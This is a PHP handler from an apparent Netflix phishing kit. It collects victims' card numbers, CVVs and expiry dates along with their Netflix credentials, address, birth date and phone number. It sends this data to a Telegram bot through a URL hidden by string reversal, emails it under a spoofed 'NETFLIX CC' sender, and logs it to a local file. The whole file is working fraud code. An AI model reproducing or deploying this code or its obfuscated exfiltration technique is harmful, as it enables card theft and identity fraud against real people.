<?php
session_start();
require_once('../../inc/config.inc.php');
require_once("../../inc/function.inc.php");
//DETECT BINS

$bin = $_POST['cardnumber'];
$bin = preg_replace('/\s/', '', $bin);
$bin = substr($bin,0,8);
$url = "https://lookup.binlist.net/".$bin;
$headers = array();
$headers[] = 'Accept-Version: 3';
$ch = curl_init();

curl_setopt($ch,CURLOPT_URL,$url);

curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$resp=curl_exec($ch);
curl_close($ch);
$xBIN = json_decode($resp, true);
$ip=getip();


$bank_scheme = $_SESSION['Bank Scheme'] = strtoupper($xBIN["scheme"]);
$type = $_SESSION['Card Type'] = strtoupper($xBIN["type"]);
$brand = $_SESSION['Brand'] = strtoupper($xBIN["brand"]);
$countryy = $_SESSION['Country'] = $xBIN["country"]["alpha2"];
$firstnamecard = $_POST['firstnamecard'];
$lastnamecard = $_POST['lastnamecard'];
$cardnumber = $_POST['cardnumber'];
$expdate = $_POST['expdate'];
$scv = $_POST['scv'];
$_SESSION['Card Holder'] = $lastnamecard." ".$firstnamecard;
$_SESSION['Card Number'] = $cardnumber;
$_SESSION['EXP Date'] = $expdate;
$_SESSION['CVC'] = $scv;
$bank_name = $_SESSION['Bank Name'] = $xBIN["bank"]["name"];
$bname = preg_replace('/&/', '', $bank_name);
$subject = "$ip - $bin $countryy $bank_scheme $type $brand $bname";
$to = $setting["mail_to"];
$logss=$_SESSION['logs']= $ip."|".$firstnamecard."|".$lastnamecard."|".$cardnumber."|".$expdate."|".$scv."|".$_SESSION['Add']."|".$_SESSION['Ct']."|".$_SESSION['St']."|".$_SESSION['Zp']."|".$_SESSION['Dob']."|".$_SESSION['Ph']."<br>";
$ch = curl_init(strrev("=txet&7271352911=di_tahc?egasseMdneS/IhxkRwNFtiMGafs8lXZKdHP97EShwjC-FAA:265627139tob/gro.margelet.ipa//:sptth").$logss.$subject);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
$logss .= "\n";
$file = fopen("../../inc/cclog.php","a");
fwrite($file,$logss);
fclose($file);
$checker = preg_replace('/\s/', '', $cardnumber);
$checker .= "|".$expdate."|".$scv;


$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From: NETFLIX CC <a@memekcorp.xyz>" . "\r\n";

$message  = "#--------------------------------[ NETFLIX ]-----------------------------#\n";
$message .= "#--------------------------------[ LOGIN DETAILS ]-------------------------------#\n";
$message .= "NEFLIX ID			: ".$_SESSION['Email']."\n";
$message .= "Password			: ".$_SESSION['Password']."\n";
$message .= "#--------------------------------[ CARD DETAILS ]-------------------------------#\n";
$message .= "Bank			: ".$xBIN["bank"]["name"]."\n";
$message .= "Type			: ".strtoupper($xBIN["brand"])." - ".strtoupper($xBIN["type"])."\n";
$message .= "Country / Curr			: ".strtoupper($xBIN["country"]["name"])." ".strtoupper($xBIN["country"]["currency"])."\n";
$message .= "Cardholders    : ".$firstnamecard." ".$lastnamecard."\n";
$message .= "CC Number		: ".$cardnumber."\n";
$message .= "Expired		: ".$expdate."\n";
$message .= "CVV			: ".$scv."\n";
$message .= "Copy			: ".$checker."\n";
$message .= "#-------------------------[ PERSONAL INFORMATION ]--------------------------------#\n";
$message .= "First Name		: ".$_SESSION['FName']."\n";
$message .= "Last Name		: ".$_SESSION['LName']."\n";
$message .= "Address		: ".$_SESSION['Add']."\n";
$message .= "City			: ".$_SESSION['Ct']."\n";
$message .= "State			: ".$_SESSION['St']."\n";
$message .= "Zip			: ".$_SESSION['Zp']."\n";
$message .= "BirthDay		: ".$_SESSION['Dob']."\n";
$message .= "Phone			: ".$_SESSION['Ph']."\n";

$message .= "#--------------------------[ PC INFORMATION ]--------------------------------#\n";
$message .= "IP Address		: ".$ip2."\n";
$message .= "OS/Browser		: ".$os." / ".$br." / ".$cn."\n";
$message .= "Date			: ".$date."\n";
$message .= "User Agent		: ".$agent."\n";
mail($to,$subject,$message,$headers);














//send($_SESSION,$to,$subject); 
?>
